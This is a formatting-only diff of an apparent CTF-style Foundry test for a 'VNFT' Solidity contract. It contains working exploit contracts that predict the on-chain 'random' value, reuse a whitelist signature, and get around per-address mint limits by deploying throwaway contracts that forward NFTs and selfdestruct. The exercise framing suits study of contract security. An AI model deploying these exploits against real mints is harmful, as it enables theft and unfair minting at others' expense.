@@ -7,35 +7,17 @@ import "../src/VNFT.sol";
 /// @notice A generic interface for a contract which properly accepts ERC721 tokens.
 /// @author Solmate (https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC721.sol)
 abstract contract ERC721TokenReceiver {
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes calldata
-    ) external virtual returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {
         return ERC721TokenReceiver.onERC721Received.selector;
     }
 }
 
 interface IVNFT {
-    function imFeelingLucky(
-        address to,
-        uint256 qty,
-        uint256 number
-    ) external;
+    function imFeelingLucky(address to, uint256 qty, uint256 number) external;
 
-    function whitelistMint(
-        address to,
-        uint256 qty,
-        bytes32 hash,
-        bytes memory signature
-    ) external payable;
+    function whitelistMint(address to, uint256 qty, bytes32 hash, bytes memory signature) external payable;
 
-    function safeTransferFrom(
-        address from,
-        address to,
-        uint256 id
-    ) external;
+    function safeTransferFrom(address from, address to, uint256 id) external;
 
     function totalSupply() external returns (uint256);
 
@@ -64,15 +46,8 @@ contract Attacker {
     constructor(address EOA, address vnft) {
         uint256 currentId = IVNFT(vnft).totalSupply();
 
-        uint256 randomNumber = uint256(
-            keccak256(
-                abi.encodePacked(
-                    blockhash(block.number - 1),
-                    block.timestamp,
-                    currentId
-                )
-            )
-        ) % 100;
+        uint256 randomNumber =
+            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, currentId))) % 100;
 
         IVNFT(vnft).imFeelingLucky(address(this), 2, randomNumber);
         IVNFT(vnft).safeTransferFrom(address(this), EOA, currentId++);
@@ -81,23 +56,13 @@ contract Attacker {
         selfdestruct(payable(EOA));
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes calldata
-    ) external virtual returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {
         return ERC721TokenReceiver.onERC721Received.selector;
     }
 }
 
 contract AttackerWhitelist {
-    constructor(
-        address EOA,
-        address vnft,
-        bytes32 hash,
-        bytes memory signature
-    ) {
+    constructor(address EOA, address vnft, bytes32 hash, bytes memory signature) {
         uint256 currentId = IVNFT(vnft).totalSupply();
 
         IVNFT(vnft).whitelistMint(address(this), 2, hash, signature);
@@ -107,12 +72,7 @@ contract AttackerWhitelist {
         selfdestruct(payable(EOA));
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes calldata
-    ) external virtual returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {
         return ERC721TokenReceiver.onERC721Received.selector;
     }
 }
@@ -150,7 +110,9 @@ contract VNFTtest is Test {
         vm.startPrank(alice);
 
         // deploy several smart contracts, each one is minting 2 nfts and sending those to alice
-        for (uint256 i; i < 5; i++) new Attacker(alice, address(vnft));
+        for (uint256 i; i < 5; i++) {
+            new Attacker(alice, address(vnft));
+        }
 
         vm.stopPrank();
 
@@ -161,12 +123,8 @@ contract VNFTtest is Test {
     function testAttackWhitelist() public {
         // bob signs message for whitelist mint
         bytes32 hash = keccak256("EthernautDAO");
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
-            2,
-            keccak256(
-                abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
-            )
-        );
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(2, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)));
         bytes memory signature = abi.encodePacked(r, s, v);
 
         // bob mints first via whitelistMint
@@ -177,8 +135,9 @@ contract VNFTtest is Test {
         vm.startPrank(alice);
 
         // deploy several smart contracts, each one is minting 2 nfts and sending those to alice
-        for (uint256 i; i < 5; i++)
+        for (uint256 i; i < 5; i++) {
             new AttackerWhitelist(alice, address(vnft), hash, signature);
+        }
 
         vm.stopPrank();
 
